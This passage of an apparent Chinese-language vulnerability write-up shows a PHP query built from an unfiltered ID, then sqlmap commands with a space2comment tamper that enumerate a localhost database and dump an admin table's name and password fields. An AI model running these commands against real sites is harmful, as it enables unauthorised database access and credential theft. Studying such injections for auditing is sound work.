```
$r=Qra(Qry("Select ID,Nm,Nc,Np,Ni,Nb,Nx,Nk,Ns,Nr,Nw,Nf From ".$pre."goods Where Nh=0 And ID=".$n));
```

### 0x02 漏洞利用

接下来我们偷个懒祭出神器SQLMAP，找下空格替换为/\*\*/的tamper![](../Images/8508d821ef99846d883b58b861f7e5da.png)这里找到space2comment.py，我们接下来就用这个  
sqlmap 构造参数

*   

```
`python2 sqlmap.py -u "http://localhost/item.php?id=1" --dbms mysql --tamper=space2comment --current-db -v 3`
```

  
![](../Images/a944e8961a6069259e69d8ac08b8d2aa.png)数据库：test2  
继续跑数据表

*   

```
`python2 sqlmap.py -u "http://localhost/item.php?id=1" --dbms mysql --tamper=space2comment -D "test2" --tables -v 3`
```

  
![](../Images/41ea2e15c2078ac3407e709c8546ecc5.png)  
跑xxx\_admin 内的字段名

*   

```
`python2 sqlmap.py -u "http://localhost/item.php?id=1" --dbms mysql --tamper=space2comment -D "test2" -T "xxx_admin" --columns -v 3`
```

![](../Images/0e57e4e620bb995fd698617975413f4a.png)  
跑Nm，Np字段内容

*   

```
`python2 sqlmap.py -u "http://localhost/item.php?id=1" --dbms mysql --tamper=space2comment -D "test2" -T "xxx_admin" --columns -C "Nm,Np" --dump -v 3`
```
